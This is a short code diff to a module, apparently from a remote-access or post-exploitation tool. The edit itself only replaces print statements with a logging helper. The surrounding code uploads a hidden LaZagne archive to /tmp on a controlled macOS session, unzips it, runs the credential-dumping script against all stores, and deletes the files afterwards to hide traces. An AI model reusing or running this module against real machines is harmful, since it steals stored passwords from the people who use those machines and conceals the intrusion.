@@ -8,9 +8,9 @@ class command:
         self.type = "custom"
     
     def run(self,session,cmd_data):
-    	print "Uploading..."
+    	h.info_general("Uploading...")
     	session.upload_file("resources/lazagne_macos.zip","/tmp",".lazagne_macos.zip")
-    	print "Running..."
+    	h.info_general("Running...")
         payload = "/tmp/.lazagne_macos.zip -d /tmp/.lazagne >/dev/null;rm /tmp/.lazagne_macos.zip;/usr/bin/python /tmp/.lazagne/lazagne_macos/laZagne.py all;rm -rf /tmp/.lazagne"
         result = session.send_command({"cmd":"unzip","args":payload})
         print result
